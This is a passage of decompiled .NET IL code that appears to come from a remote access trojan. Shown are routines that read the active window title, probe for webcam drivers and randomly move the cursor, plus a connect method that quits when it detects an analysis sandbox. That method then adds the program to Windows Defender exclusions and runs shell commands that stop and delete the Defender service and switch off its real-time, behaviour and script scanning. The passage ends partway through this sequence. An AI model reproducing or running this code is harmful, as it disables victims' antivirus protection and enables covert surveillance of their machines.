    IL_0006:  ldarg.0
    IL_0007:  ldnull
    IL_0008:  ldftn      void j.OK::Mouse()
    IL_000e:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0013:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
    IL_0018:  stfld      class [mscorlib]System.Threading.Thread j.OK::MouseThread
    IL_001d:  ret
  } // end of method OK::.ctor

  .method private static void  _Lambda__1(object a0) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  castclass  uint8[]
    IL_0006:  call       void j.OK::Ind(uint8[])
    IL_000b:  ret
  } // end of method OK::_Lambda__1

  .method private static void  _Lambda__2(object a0,
                                          class [System]Microsoft.Win32.SessionEndingEventArgs a1) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  call       void j.OK::ED()
    IL_0005:  ret
  } // end of method OK::_Lambda__2

  .method public static string  ACT() cil managed
  {
    // Code size       108 (0x6c)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             native int V_2,
             string V_3,
             class [mscorlib]System.Exception V_4)
    .try
    {
      IL_0000:  call       native int j.OK::GetForegroundWindow()
      IL_0005:  stloc.2
      IL_0006:  ldloc.2
      IL_0007:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_000c:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                     native int)
      IL_0011:  brfalse.s  IL_001b

      IL_0013:  ldstr      ""
      IL_0018:  stloc.0
      IL_0019:  leave.s    IL_006a

      IL_001b:  ldloc.2
      IL_001c:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
      IL_0021:  call       int32 j.OK::GetWindowTextLength(int64)
      IL_0026:  ldc.i4.1
      IL_0027:  add.ovf
      IL_0028:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_002d:  stloc.3
      IL_002e:  ldloc.2
      IL_002f:  ldloca.s   V_3
      IL_0031:  ldloc.3
      IL_0032:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0037:  call       int32 j.OK::GetWindowText(native int,
                                                     string&,
                                                     int32)
      IL_003c:  pop
      IL_003d:  ldloca.s   V_3
      IL_003f:  call       string j.OK::ENB(string&)
      IL_0044:  stloc.1
      IL_0045:  leave.s    IL_0068

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0047:  dup
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004d:  stloc.s    V_4
      IL_004f:  ldloc.s    V_4
      IL_0051:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0056:  ldstr      ""
      IL_005b:  stloc.1
      IL_005c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0061:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0066:  leave.s    IL_0068

    }  // end handler
    IL_0068:  ldloc.1
    IL_0069:  stloc.0
    IL_006a:  ldloc.0
    IL_006b:  ret
  } // end of method OK::ACT

  .method public static string  RN(int32 c) cil managed
  {
    // Code size       74 (0x4a)
    .maxstack  5
    .locals init (class [mscorlib]System.Random V_0,
             string V_1,
             string V_2,
             int32 V_3,
             int32 V_4)
    IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.VBMath::Randomize()
    IL_0005:  newobj     instance void [mscorlib]System.Random::.ctor()
    IL_000a:  stloc.0
    IL_000b:  ldstr      ""
    IL_0010:  stloc.1
    IL_0011:  ldstr      "abcdefghijklmnopqrstuvwxyz"
    IL_0016:  stloc.2
    IL_0017:  ldarg.0
    IL_0018:  stloc.3
    IL_0019:  ldc.i4.1
    IL_001a:  stloc.s    V_4
    IL_001c:  br.s       IL_0043

    IL_001e:  ldloc.1
    IL_001f:  ldloc.2
    IL_0020:  ldloc.0
    IL_0021:  ldc.i4.0
    IL_0022:  ldloc.2
    IL_0023:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0028:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                      int32)
    IL_002d:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
    IL_0032:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(char)
    IL_0037:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003c:  stloc.1
    IL_003d:  ldloc.s    V_4
    IL_003f:  ldc.i4.1
    IL_0040:  add.ovf
    IL_0041:  stloc.s    V_4
    IL_0043:  ldloc.s    V_4
    IL_0045:  ldloc.3
    IL_0046:  ble.s      IL_001e

    IL_0048:  ldloc.1
    IL_0049:  ret
  } // end of method OK::RN

  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          void  SendMessage(int32 hWnd,
                            uint32 msg,
                            uint32 wParam,
                            int32 lparam) cil managed preservesig
  {
  }
  .method private static void  Mouse() cil managed
  {
    // Code size       134 (0x86)
    .maxstack  4
    .locals init (class [mscorlib]System.Threading.Thread V_0,
             int32 V_1,
             int32 V_2,
             valuetype [System.Drawing]System.Drawing.Rectangle V_3,
             int32 V_4,
             int32 V_5,
             int32 V_6,
             valuetype [System.Drawing]System.Drawing.Point V_7)
    IL_0000:  ldnull
    IL_0001:  ldftn      void j.OK::Mouse()
    IL_0007:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_000c:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
    IL_0011:  stloc.0
    IL_0012:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_0017:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_001c:  stloc.3
    IL_001d:  ldloca.s   V_3
    IL_001f:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
    IL_0024:  stloc.1
    IL_0025:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_002a:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_002f:  stloc.3
    IL_0030:  ldloca.s   V_3
    IL_0032:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
    IL_0037:  stloc.2
    IL_0038:  ldc.i4.1
    IL_0039:  stloc.s    V_4
    IL_003b:  newobj     instance void [mscorlib]System.Random::.ctor()
    IL_0040:  dup
    IL_0041:  ldc.i4.0
    IL_0042:  ldloc.2
    IL_0043:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                      int32)
    IL_0048:  stloc.s    V_5
    IL_004a:  ldc.i4.0
    IL_004b:  ldloc.1
    IL_004c:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                      int32)
    IL_0051:  stloc.s    V_6
    IL_0053:  ldloca.s   V_7
    IL_0055:  ldloc.s    V_5
    IL_0057:  call       instance void [System.Drawing]System.Drawing.Point::set_X(int32)
    IL_005c:  ldloca.s   V_7
    IL_005e:  ldloc.s    V_6
    IL_0060:  call       instance void [System.Drawing]System.Drawing.Point::set_Y(int32)
    IL_0065:  ldloc.s    V_7
    IL_0067:  call       void [System.Windows.Forms]System.Windows.Forms.Cursor::set_Position(valuetype [System.Drawing]System.Drawing.Point)
    IL_006c:  ldc.i4.s   50
    IL_006e:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0073:  ldloc.s    V_4
    IL_0075:  ldc.i4.1
    IL_0076:  add.ovf
    IL_0077:  stloc.s    V_4
    IL_0079:  ldloc.s    V_4
    IL_007b:  ldc.i4.s   100
    IL_007d:  ble.s      IL_003b

    IL_007f:  ldloc.0
    IL_0080:  callvirt   instance void [mscorlib]System.Threading.Thread::Abort()
    IL_0085:  ret
  } // end of method OK::Mouse

  .method public static string  BS(uint8[]& B) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_000c:  ret
  } // end of method OK::BS

  .method public static bool  Cam() cil managed
  {
    // Code size       74 (0x4a)
    .maxstack  5
    .locals init (bool V_0,
             int32 V_1,
             string V_2,
             string V_3,
             class [mscorlib]System.Exception V_4)
    .try
    {
      IL_0000:  ldc.i4.0
      IL_0001:  stloc.1
      IL_0002:  ldnull
      IL_0003:  stloc.2
      IL_0004:  ldloc.1
      IL_0005:  conv.ovf.i2
      IL_0006:  ldc.i4.s   100
      IL_0008:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_000d:  stloc.3
      IL_000e:  ldloca.s   V_3
      IL_0010:  ldc.i4.s   100
      IL_0012:  ldloca.s   V_2
      IL_0014:  ldc.i4.s   100
      IL_0016:  call       bool j.OK::capGetDriverDescriptionA(int16,
                                                               string&,
                                                               int32,
                                                               string&,
                                                               int32)
      IL_001b:  brfalse.s  IL_0021

      IL_001d:  ldc.i4.1
      IL_001e:  stloc.0
      IL_001f:  leave.s    IL_0048

      IL_0021:  ldloc.1
      IL_0022:  ldc.i4.1
      IL_0023:  add.ovf
      IL_0024:  stloc.1
      IL_0025:  ldloc.1
      IL_0026:  ldc.i4.4
      IL_0027:  ble.s      IL_0002

      IL_0029:  leave.s    IL_0046

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002b:  dup
      IL_002c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0031:  stloc.s    V_4
      IL_0033:  ldloc.s    V_4
      IL_0035:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0044:  leave.s    IL_0046

    }  // end handler
    IL_0046:  ldc.i4.0
    IL_0047:  stloc.0
    IL_0048:  ldloc.0
    IL_0049:  ret
  } // end of method OK::Cam

  .method public static pinvokeimpl("avicap32.dll" nomangle ansi lasterr winapi) 
          bool  capGetDriverDescriptionA(int16 wDriver,
                                         string&  marshal( byvalstr) lpszName,
                                         int32 cbName,
                                         string&  marshal( byvalstr) lpszVer,
                                         int32 cbVer) cil managed preservesig
  {
  }
  .method private static bool  CompDir(class [mscorlib]System.IO.FileInfo F1,
                                       class [mscorlib]System.IO.FileInfo F2) cil managed
  {
    // Code size       121 (0x79)
    .maxstack  3
    .locals init (bool V_0,
             class [mscorlib]System.IO.DirectoryInfo V_1,
             class [mscorlib]System.IO.DirectoryInfo V_2)
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0006:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_000b:  ldarg.1
    IL_000c:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0011:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0016:  ldc.i4.0
    IL_0017:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_001c:  brtrue.s   IL_0075

    IL_001e:  ldarg.0
    IL_001f:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_0024:  stloc.1
    IL_0025:  ldarg.1
    IL_0026:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_002b:  stloc.2
    IL_002c:  ldloc.1
    IL_002d:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0032:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0037:  ldloc.2
    IL_0038:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_003d:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0042:  ldc.i4.0
    IL_0043:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0048:  brfalse.s  IL_004e

    IL_004a:  ldc.i4.0
    IL_004b:  stloc.0
    IL_004c:  br.s       IL_0077

    IL_004e:  ldloc.1
    IL_004f:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_0054:  stloc.1
    IL_0055:  ldloc.2
    IL_0056:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_005b:  stloc.2
    IL_005c:  ldloc.1
    IL_005d:  ldnull
    IL_005e:  ceq
    IL_0060:  ldloc.2
    IL_0061:  ldnull
    IL_0062:  ceq
    IL_0064:  and
    IL_0065:  brfalse.s  IL_006b

    IL_0067:  ldc.i4.1
    IL_0068:  stloc.0
    IL_0069:  br.s       IL_0077

    IL_006b:  ldloc.1
    IL_006c:  brtrue.s   IL_0072

    IL_006e:  ldc.i4.0
    IL_006f:  stloc.0
    IL_0070:  br.s       IL_0077

    IL_0072:  ldloc.2
    IL_0073:  brtrue.s   IL_002c

    IL_0075:  ldc.i4.0
    IL_0076:  stloc.0
    IL_0077:  ldloc.0
    IL_0078:  ret
  } // end of method OK::CompDir

  .method public static bool  connect() cil managed noinlining nooptimization
  {
    // Code size       2103 (0x837)
    .maxstack  7
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1,
             string V_2,
             string[] V_3,
             int32 V_4,
             int32 V_5,
             int32 V_6,
             class [mscorlib]System.Exception V_7,
             int32 V_8,
             class [mscorlib]System.Exception V_9,
             object V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             class [mscorlib]System.Exception V_13,
             string V_14,
             string V_15,
             class [mscorlib]System.Exception V_16,
             class [mscorlib]System.Exception V_17)
    IL_0000:  ldsfld     bool j.OK::ANYRUN
    IL_0005:  brfalse.s  IL_006c

    IL_0007:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_000c:  ldstr      "sand.dat"
    IL_0011:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0016:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_001b:  brfalse.s  IL_0029

    IL_001d:  ldstr      "127.0.0.1"
    IL_0022:  stsfld     string j.OK::H
    IL_0027:  br.s       IL_003d

    IL_0029:  newobj     instance void Form2::.ctor()
    IL_002e:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::Show()
    IL_0033:  ldc.i4     0x7d0
    IL_0038:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_003d:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_0042:  ldstr      "sand.dat"
    IL_0047:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_004c:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_0051:  brfalse.s  IL_006c

    IL_0053:  ldstr      "127.0.0.1"
    IL_0058:  stsfld     string j.OK::H
    IL_005d:  call       void j.OK::UNS()
    IL_0062:  call       void [System.Windows.Forms]System.Windows.Forms.Application::Exit()
    IL_0067:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_006c:  ldsfld     string j.OK::exlude
    IL_0071:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0076:  brfalse.s  IL_00c6

    .try
    {
      IL_0078:  ldc.i4.1
      IL_0079:  newarr     [mscorlib]System.String
      IL_007e:  dup
      IL_007f:  ldc.i4.0
      IL_0080:  ldstr      "cmd /c powershell Add-MpPreference -ExclusionPath \""
      IL_0085:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
      IL_008a:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
      IL_008f:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0094:  call       string [mscorlib]System.IO.Path::GetFileName(string)
      IL_0099:  ldstr      "\" -Force"
      IL_009e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_00a3:  stelem.ref
      IL_00a4:  call       string [mscorlib]System.String::Concat(string[])
      IL_00a9:  ldc.i4.0
      IL_00aa:  ldc.i4.1
      IL_00ab:  ldc.i4     0x1388
      IL_00b0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_00b5:  pop
      IL_00b6:  leave.s    IL_00c6

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b8:  dup
      IL_00b9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00be:  stloc.0
      IL_00bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c4:  leave.s    IL_00c6

    }  // end handler
    IL_00c6:  ldsfld     string j.OK::murderdefender
    IL_00cb:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00d0:  brfalse    IL_03e5

    .try
    {
      IL_00d5:  ldc.i4.1
      IL_00d6:  newarr     [mscorlib]System.String
      IL_00db:  dup
      IL_00dc:  ldc.i4.0
      IL_00dd:  ldstr      "cmd /c sc stop windefend"
      IL_00e2:  stelem.ref
      IL_00e3:  call       string [mscorlib]System.String::Concat(string[])
      IL_00e8:  ldc.i4.0
      IL_00e9:  ldc.i4.1
      IL_00ea:  ldc.i4     0x1388
      IL_00ef:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_00f4:  pop
      IL_00f5:  ldc.i4.1
      IL_00f6:  newarr     [mscorlib]System.String
      IL_00fb:  dup
      IL_00fc:  ldc.i4.0
      IL_00fd:  ldstr      "cmd /c sc delete windefend"
      IL_0102:  stelem.ref
      IL_0103:  call       string [mscorlib]System.String::Concat(string[])
      IL_0108:  ldc.i4.0
      IL_0109:  ldc.i4.1
      IL_010a:  ldc.i4     0x1388
      IL_010f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0114:  pop
      IL_0115:  ldc.i4.1
      IL_0116:  newarr     [mscorlib]System.String
      IL_011b:  dup
      IL_011c:  ldc.i4.0
      IL_011d:  ldstr      "cmd /c powershell Set-MpPreference -DisableRealtim"
      + "eMonitoring $true"
      IL_0122:  stelem.ref
      IL_0123:  call       string [mscorlib]System.String::Concat(string[])
      IL_0128:  ldc.i4.0
      IL_0129:  ldc.i4.1
      IL_012a:  ldc.i4     0x1388
      IL_012f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0134:  pop
      IL_0135:  ldc.i4.1
      IL_0136:  newarr     [mscorlib]System.String
      IL_013b:  dup
      IL_013c:  ldc.i4.0
      IL_013d:  ldstr      "cmd /c powershell Set-MpPreference -DisableBehavio"
      + "rMonitoring $true"
      IL_0142:  stelem.ref
      IL_0143:  call       string [mscorlib]System.String::Concat(string[])
      IL_0148:  ldc.i4.0
      IL_0149:  ldc.i4.1
      IL_014a:  ldc.i4     0x1388
      IL_014f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0154:  pop
      IL_0155:  ldc.i4.1
      IL_0156:  newarr     [mscorlib]System.String
      IL_015b:  dup
      IL_015c:  ldc.i4.0
      IL_015d:  ldstr      "cmd /c powershell Set-MpPreference -DisableBlockAt"
      + "FirstSeen $true"
      IL_0162:  stelem.ref
      IL_0163:  call       string [mscorlib]System.String::Concat(string[])
      IL_0168:  ldc.i4.0
      IL_0169:  ldc.i4.1
      IL_016a:  ldc.i4     0x1388
      IL_016f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0174:  pop
      IL_0175:  ldc.i4.1
      IL_0176:  newarr     [mscorlib]System.String
      IL_017b:  dup
      IL_017c:  ldc.i4.0
      IL_017d:  ldstr      "cmd /c powershell Set-MpPreference -DisableIOAVPro"
      + "tection $true"
      IL_0182:  stelem.ref
      IL_0183:  call       string [mscorlib]System.String::Concat(string[])
      IL_0188:  ldc.i4.0
      IL_0189:  ldc.i4.1
      IL_018a:  ldc.i4     0x1388
      IL_018f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0194:  pop
      IL_0195:  ldc.i4.1
      IL_0196:  newarr     [mscorlib]System.String
      IL_019b:  dup
      IL_019c:  ldc.i4.0
      IL_019d:  ldstr      "cmd /c powershell Set-MpPreference -DisablePrivacy"
      + "Mode $true"
      IL_01a2:  stelem.ref
      IL_01a3:  call       string [mscorlib]System.String::Concat(string[])
      IL_01a8:  ldc.i4.0
      IL_01a9:  ldc.i4.1
      IL_01aa:  ldc.i4     0x1388
      IL_01af:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_01b4:  pop
      IL_01b5:  ldc.i4.1
      IL_01b6:  newarr     [mscorlib]System.String
      IL_01bb:  dup
      IL_01bc:  ldc.i4.0
      IL_01bd:  ldstr      "cmd /c powershell Set-MpPreference -DisableIntrusi"
      + "onPreventionSystem $true"
      IL_01c2:  stelem.ref
      IL_01c3:  call       string [mscorlib]System.String::Concat(string[])
      IL_01c8:  ldc.i4.0
      IL_01c9:  ldc.i4.1
      IL_01ca:  ldc.i4     0x1388
      IL_01cf:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_01d4:  pop
      IL_01d5:  ldc.i4.1
      IL_01d6:  newarr     [mscorlib]System.String
      IL_01db:  dup
      IL_01dc:  ldc.i4.0
      IL_01dd:  ldstr      "cmd /c powershell Set-MpPreference -SevereThreatDe"
      + "faultAction 6"
      IL_01e2:  stelem.ref
      IL_01e3:  call       string [mscorlib]System.String::Concat(string[])
      IL_01e8:  ldc.i4.0
      IL_01e9:  ldc.i4.1
      IL_01ea:  ldc.i4     0x1388
      IL_01ef:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_01f4:  pop
      IL_01f5:  ldc.i4.1
      IL_01f6:  newarr     [mscorlib]System.String
      IL_01fb:  dup
      IL_01fc:  ldc.i4.0
      IL_01fd:  ldstr      "cmd /c powershell Set-MpPreference -LowThreatDefau"
      + "ltAction 6"
      IL_0202:  stelem.ref
      IL_0203:  call       string [mscorlib]System.String::Concat(string[])
      IL_0208:  ldc.i4.0
      IL_0209:  ldc.i4.1
      IL_020a:  ldc.i4     0x1388
      IL_020f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0214:  pop
      IL_0215:  ldc.i4.1
      IL_0216:  newarr     [mscorlib]System.String
      IL_021b:  dup
      IL_021c:  ldc.i4.0
      IL_021d:  ldstr      "cmd /c powershell Set-MpPreference -ModerateThreat"
      + "DefaultAction 6"
      IL_0222:  stelem.ref
      IL_0223:  call       string [mscorlib]System.String::Concat(string[])
      IL_0228:  ldc.i4.0
      IL_0229:  ldc.i4.1
      IL_022a:  ldc.i4     0x1388
      IL_022f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0234:  pop
      IL_0235:  ldc.i4.1
      IL_0236:  newarr     [mscorlib]System.String
      IL_023b:  dup
      IL_023c:  ldc.i4.0
      IL_023d:  ldstr      "cmd /c powershell Set-MpPreference -DisableScriptS"
      + "canning $true"
      IL_0242:  stelem.ref
      IL_0243:  call       string [mscorlib]System.String::Concat(string[])
      IL_0248:  ldc.i4.0
      IL_0249:  ldc.i4.1
      IL_024a:  ldc.i4     0x1388
      IL_024f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0254:  pop
      IL_0255:  ldc.i4.1
      IL_0256:  newarr     [mscorlib]System.String
      IL_025b:  dup
      IL_025c:  ldc.i4.0
      IL_025d:  ldstr      "cmd /c powershell Set-MpPreference -DisableArchive"
      + "Scanning $true"
      IL_0262:  stelem.ref
      IL_0263:  call       string [mscorlib]System.String::Concat(string[])
      IL_0268:  ldc.i4.0
      IL_0269:  ldc.i4.1
      IL_026a:  ldc.i4     0x1388
      IL_026f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0274:  pop
      IL_0275:  ldc.i4.1
      IL_0276:  newarr     [mscorlib]System.String
      IL_027b:  dup
      IL_027c:  ldc.i4.0
      IL_027d:  ldstr      "cmd /c powershell Set-MpPreference -SignatureDisab"
      + "leUpdateOnStartupWithoutEngine $true"
      IL_0282:  stelem.ref
      IL_0283:  call       string [mscorlib]System.String::Concat(string[])
      IL_0288:  ldc.i4.0
      IL_0289:  ldc.i4.1
      IL_028a:  ldc.i4     0x1388
      IL_028f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0294:  pop
      IL_0295:  ldc.i4.1
      IL_0296:  newarr     [mscorlib]System.String
      IL_029b:  dup
      IL_029c:  ldc.i4.0
      IL_029d:  ldstr      "cmd /c powershell Set-MpPreference -EnableControll"
      + "edFolderAccess Disabled"
      IL_02a2:  stelem.ref
      IL_02a3:  call       string [mscorlib]System.String::Concat(string[])
      IL_02a8:  ldc.i4.0
      IL_02a9:  ldc.i4.1
      IL_02aa:  ldc.i4     0x1388
      IL_02af:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_02b4:  pop
      IL_02b5:  ldc.i4.1
      IL_02b6:  newarr     [mscorlib]System.String
      IL_02bb:  dup
      IL_02bc:  ldc.i4.0
      IL_02bd:  ldstr      "cmd /c powershell Set-MpPreference -SubmitSamplesC"
      + "onsent 2"
      IL_02c2:  stelem.ref
      IL_02c3:  call       string [mscorlib]System.String::Concat(string[])
      IL_02c8:  ldc.i4.0
      IL_02c9:  ldc.i4.1
      IL_02ca:  ldc.i4     0x1388
      IL_02cf:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
